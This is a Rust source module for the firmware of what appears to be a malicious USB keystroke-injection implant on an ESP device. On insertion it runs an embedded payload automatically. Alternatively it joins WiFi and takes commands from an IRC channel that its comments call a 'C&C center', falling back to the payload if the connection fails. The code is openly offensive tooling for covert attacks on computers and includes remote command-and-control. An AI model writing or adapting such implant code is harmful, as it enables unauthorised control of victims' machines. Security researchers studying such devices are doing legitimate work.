use std::env;
use std::path::PathBuf;
use std::process::exit;
use log::warn;
use serde::Deserialize;
use san_common::hid_actuator::HidActuator;
use crate::actuator::esp_actuator::EspActuator;
use crate::irc_client::irc_client::IRClient;
use crate::irc_client::wifi_handler::WiFiHandler;

#[derive(Deserialize)]
struct ConfigData {
    mode: String,
    ssid: String,
    password: String,
    server_addr: String,
    server_port: usize,
    server_name: String,
    channel_name: String,
    username: String,
}

pub enum SanMode {
    // Autonomous mode where predefined payload will be run at the moment of device mounting
    Auto,
    // Remote mode where the device will try to connect to the remote C&C center, otherwise predefined payload will be run
    Remote,
}

pub fn run() {
    let config = parse_config();
    let mode = if config.mode == "auto" { SanMode::Auto } else { SanMode::Remote };
    match mode {
        SanMode::Auto => {
            run_auto();
        }
        SanMode::Remote => {
            run_remote(config)
        }
    }
}

fn parse_config() -> ConfigData {
    let config = include_str!("../config.toml");
    let config_toml: ConfigData = toml::from_str(config).expect("Unable to deserialize file config.toml!");
    config_toml
}

fn run_auto() {
    let bytecode = include_bytes!("../payload.sanb");
    let mut actuator = EspActuator::new();
    actuator.init_actuator();
    actuator.sleep(3000);
    san_vm::runner::run_bytecode(actuator, bytecode);
}

fn run_remote(config: ConfigData) {
    let mut wifi = WiFiHandler::new(config.ssid, config.password).unwrap_or_else(|e| {
        warn!("Error creating wifi handler. Initiating fallback payload...");
        run_auto();
        exit(0);
    });
    wifi.connect_wifi().unwrap_or_else(|e| {
        warn!("Error connecting to wifi. Initiating fallback payload...");
        run_auto();
        exit(0)
    });
    let mut irc = IRClient::new(config.server_addr,
                                config.server_port,
                                config.server_name,
                                config.channel_name,
                                config.username).unwrap_or_else(|e| {
        warn!("Error creating wifi handler. Initiating fallback payload...");
        run_auto();
        exit(0);
    });

    match irc.client_loop() {
        Err(e) => {
            warn!("Error while trying to connect to IRC server: {}. Initiating fallback payload...", e.to_string());
            run_auto();
        }
        _ => {}
    }
}